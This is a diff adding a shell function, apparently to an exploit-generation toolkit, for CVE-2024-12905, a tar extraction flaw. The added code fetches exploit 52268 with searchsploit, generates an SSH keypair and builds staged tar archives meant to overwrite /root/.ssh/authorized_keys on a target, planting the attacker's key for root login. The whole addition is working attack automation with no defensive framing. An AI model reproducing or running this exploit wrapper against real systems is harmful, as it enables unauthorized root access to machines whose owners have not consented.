@@ -776,3 +776,42 @@ perform_cve_2021_22204 () {
     popd || exit 1
     generate_exploit_download
 }
+
+#tar exploit
+perform_cve_2024_12905() {
+    local cve_dir="CVE-2024-12905"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir "$cve_dir"
+    fi
+    pushd "$cve_dir" || exit 1
+    if [[ ! -f 52268.py ]]; then
+        searchsploit -m 52268
+    fi
+    if [[ -z $target_file ]]; then
+        if [[ ! -f authorized_keys ]]; then
+            ssh-keygen -t rsa -b 2048 -f id_rsa -q -N ""
+            chmod 600 id_rsa
+            cat id_rsa.pub > authorized_keys
+            chmod 600 authorized_keys
+        fi
+        target_file="authorized_keys"
+        echo "target_file is not set, using default: $target_file"
+    fi
+    if [[ -z $target_path ]]; then
+        target_path="/root/.ssh/authorized_keys"
+        echo "target_path is not set, using default: $target_path"
+    fi
+    rm normal_file
+    if [[ -f stage_1.tar ]]; then
+        rm stage_1.tar
+    fi
+    if [[ -f stage_2.tar ]]; then
+        rm stage_2.tar
+    fi
+    python 52268.py "$target_file" "$target_path"
+    popd || exit 1
+    cp "$cve_dir/id_rsa" .
+    cp "$cve_dir/stage_1.tar" .
+    cp "$cve_dir/stage_2.tar" .
+
+}
